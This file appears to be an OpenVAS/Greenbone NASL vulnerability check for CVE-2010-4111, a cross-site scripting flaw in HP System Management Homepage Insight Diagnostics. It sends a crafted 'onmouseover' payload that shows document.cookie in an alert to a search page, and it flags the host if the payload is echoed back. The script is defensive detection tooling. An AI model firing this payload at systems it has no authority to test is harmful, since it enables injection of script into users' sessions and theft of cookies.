CPE = "cpe:/a:hp:system_management_homepage";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.902431" );
	script_version( "2021-09-01T07:45:06+0000" );
	script_tag( name: "last_modification", value: "2021-09-01 07:45:06 +0000 (Wed, 01 Sep 2021)" );
	script_tag( name: "creation_date", value: "2011-06-01 11:16:16 +0200 (Wed, 01 Jun 2011)" );
	script_cve_id( "CVE-2010-4111" );
	script_bugtraq_id( 45420 );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_name( "HP SMH Insight Diagnostics 'help/search.php?' Cross Site Scripting Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_hp_smh_detect.sc" );
	script_mandatory_keys( "HP/SMH/installed" );
	script_require_ports( "Services/www", 2301, 2381 );
	script_tag( name: "impact", value: "Successful exploitation will allow attackers to inject arbitrary HTML code
  in the context of an affected site." );
	script_tag( name: "affected", value: "HP Insight Diagnostics Online Edition before 8.5.1.3712." );
	script_tag( name: "insight", value: "The flaw is caused due imporper validation of user supplied input via
  'query=onmouseover=' to the '/frontend2/help/search.php?', which allows
  attackers to execute arbitrary HTML and script code in a user's browser
  session in the context of an affected site." );
	script_tag( name: "solution", value: "Upgrade to 8.5.1.3712 or higher versions or refer vendor advisory for update." );
	script_tag( name: "summary", value: "The host is running HP SMH with Insight Diagnostics and is prone
  to cross-site scripting vulnerability." );
	script_xref( name: "URL", value: "http://marc.info/?l=bugtraq&m=129245189832672&w=2" );
	script_xref( name: "URL", value: "http://securitytracker.com/alerts/2010/Dec/1024897.html" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/view/101636/PR10-11.txt" );
	script_xref( name: "URL", value: "http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02652463" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!hpsmhPort = get_app_port( cpe: CPE )){
	exit( 0 );
}
useragent = http_get_user_agent();
host = http_host_name( port: hpsmhPort );
attackPath = "/hpdiags/frontend2/help/search.php?query=\"onmouseover=\"alert(document.cookie);";
req = NASLString( "GET ", attackPath, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "User-Agent: ", useragent, "\\r\\n", "Cookie: Compaq-HMMD=0001-8a3348dc-f004-4dae-a746-211a6" + "d70fd51-1292315018889768; HPSMH-browser-check=done for" + " this session; curlocation-hpsmh_anonymous=; PHPSESSID=" + "2389b2ac7c2fb11b7927ab6e54c43e64\\r\\n", "\\r\\n" );
rcvRes = http_keepalive_send_recv( port: hpsmhPort, data: req );
if(IsMatchRegexp( rcvRes, "^HTTP/1\\.[01] 200" ) && ContainsString( rcvRes, "=\"alert(document.cookie);\"" )){
	report = http_report_vuln_url( port: hpsmhPort, url: attackPath );
	security_message( port: hpsmhPort, data: report );
}
exit( 99 );

